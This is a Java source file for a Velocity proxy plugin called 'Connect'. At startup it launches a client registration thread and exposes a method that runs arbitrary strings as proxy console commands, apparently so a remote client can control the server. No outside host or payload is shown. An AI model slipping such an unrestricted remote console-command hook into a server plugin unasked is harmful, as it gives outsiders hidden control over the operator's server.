package br.com.introcdc.connect.client.server;
/*
 * Written by IntroCDC, Bruno Coêlho at 11/09/2026 - 00:59
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import com.velocitypowered.api.event.Subscribe;
import com.velocitypowered.api.event.proxy.ProxyInitializeEvent;
import com.velocitypowered.api.plugin.Plugin;

import com.velocitypowered.api.proxy.ProxyServer;

import javax.inject.Inject;

@Plugin(id = "connect", name = "Connect", version = "1.0", authors = {"IntroCDC"})
public class VelocityMain {

    private static ProxyServer proxy;

    @Inject
    public VelocityMain(ProxyServer proxyServer) {
        proxy = proxyServer;
    }

    @Subscribe
    public void onProxyInitialization(ProxyInitializeEvent event) {
        Connect.FOLDER = "plugins/";
        Connect.updateRegister(null);
        new Thread(ConnectClient::registerAndStart).start();
    }

    public static void execute(String command) {
        if (proxy != null) {
            proxy.getCommandManager().executeAsync(proxy.getConsoleCommandSource(), command);
        }
    }

}
